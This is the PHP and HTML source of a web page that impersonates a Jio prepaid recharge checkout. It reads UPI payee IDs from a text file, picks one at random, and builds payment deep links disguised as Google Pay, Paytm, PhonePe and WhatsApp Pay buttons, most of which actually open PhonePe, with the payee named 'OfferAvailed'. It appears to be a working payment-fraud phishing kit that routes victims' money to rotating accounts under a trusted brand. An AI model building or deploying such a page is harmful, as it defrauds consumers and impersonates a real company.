<?php
if (isset($_GET['amount'])) {
    $amount = htmlspecialchars($_GET['amount']);
} else {
    $amount = "0"; 
}


$handle = fopen('file.txt', 'r');
$firstLine = fgets($handle);
fclose($handle);


$result = explode(',', $firstLine);
$str = $result[array_rand($result)];


$tn = rand(11111111, 99999999);
$tr = rand(111111111, 999999999);


function generateRandomString($length = 12) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)))), 1, $length);
}


$sGPAY0 = generateRandomString();

$gpy= "phonepe:/";
$ptm= "paytmmp:/";
$s0= "phonepe:/";
$default= "phonepe:/";
$wtp= "phonepe:/";
$s1 = $str . "";


//$s2 = "/pay?pa=$s1&pn=Shop&purpose=00&am=$amount&cu=INR&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr";

$s2 = "/pay?pa=$s1&tn=offerAvailed&am=$amount&pn=OfferAvailed&mode=02&mc=8999&purpose=00&cu=INR&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr";

?>


<html lang="en">

<head>
    <meta charset="utf-8">
    <link rel="icon" href="/logo.svg">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#000000">
    <meta name="description" content="Web site created using create-react-app">
    <link rel="apple-touch-icon" href="/logo.svg">
    <link rel="manifest" href="manifest.json">
    <title>Jio - Best Prepaid, Postpaid Plans</title>

    <script defer="defer" src="./static/js/main.e6bc879b.js"></script>
    <link href="./static/css/main.34fbeb72.css" rel="stylesheet">

</head>

<body>
    <div class="py-4 px-6 bg-blue-700 flex items-center justify-between text-white">
        <div class="flex items-center">
            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="text-white mr-3" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
                <path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path>
            </svg>
            <a href="/"><img src="./static/media/logo.830d463ac6b62d8cd9f6.png" alt="" class="w-8"></a>
        </div>
        <div class="mx-2">
            <div class="searchBar">
                <input id="searchQueryInput" type="text" name="searchQueryInput" placeholder="Search" value="">
                <button id="searchQuerySubmit" type="submit" name="searchQuerySubmit">
                    <svg class="h-[24px] w-[24px]" viewBox="0 0 24 24">
                        <path fill="#fff" d="M9.5,3A6.5,6.5 0 0,1 16,9.5C16,11.11 15.41,12.59 14.44,13.73L14.71,14H15.5L20.5,19L19,20.5L14,15.5V14.71L13.73,14.44C12.59,15.41 11.11,16 9.5,16A6.5,6.5 0 0,1 3,9.5A6.5,6.5 0 0,1 9.5,3M9.5,5C7,5 5,7 5,9.5C5,12 7,14 9.5,14C12,14 14,12 14,9.5C14,7 12,5 9.5,5Z"></path>
                    </svg>
                </button>
            </div>
        </div>
        <div>
            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="text-white" height="30" width="30" xmlns="http://www.w3.org/2000/svg">
                <path d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"></path>
            </svg>
        </div>
    </div>
    <div class="">
        <div class="py-1 px-[10px] my-5">
            <div class="flex space-x-4 bg-white border border-slate-200 rounded-xl w-full p-2">
                <ul class="w-full">
                    <li class="w-full my-2">
                        <div class="flex items-center justify-center py-2 w-full font-sans"><span class="text-[16px] font-semibold mr-2">Pay ₹199 using UPI</span> </div>
                    </li>
                    <li class="w-full my-2">
                        <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="<?php echo $gpy.$s2;?>"><img src="./static/media/googlepayicon.b1d2f2a111a2f792233c10265d1f0cbd.svg" class="w-10" alt=""><span class="ml-3 text-lg">Google Pay</span></a>
                    </li>
                    <li class="w-full my-2">
                        <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="<?php echo $ptm.$s2;?>"><img src="./static/media/paytm_icon.3d48b89988f13e784e647886decd7ae5.svg" class="w-10" alt=""><span class="ml-3 text-lg">Paytm</span></a>
                    </li>
                    <li class="w-full my-2">
                        <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="<?php echo $s0.$s2;?>"><img src="./static/media/phonepeicon.e79785763e0c4095b6335e54e9971960.svg" class="w-10" alt=""><span class="ml-3 text-lg">PhonePe</span></a>
                    </li>
                    <li class="w-full my-2">
                        <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="<?php echo $default.$s2;?>"><img src="./static/media/upilogo.d3c1e2271fc50a058ee6.jpeg" class="w-10" alt=""><span class="ml-3 text-lg">Other UPI</span></a>
                    </li>
                    <li class="w-full my-2">
                        <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="<?php echo $wtp.$s2;?>"><img src="./static/media/whatspp_pay.e2ed34befa5836e5a0be68764c2ee95f.svg" class="w-10" alt=""><span class="ml-3 text-lg">Whatsapp Pay</span></a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="mt-5"><img src="./static/media/secured.20c7b7cea9439246796c.jpg" alt=""><img src="./static/media/lasttwo.bfe814c92613f117536e.jpg" alt=""></div>
    </div>
</body>

</html>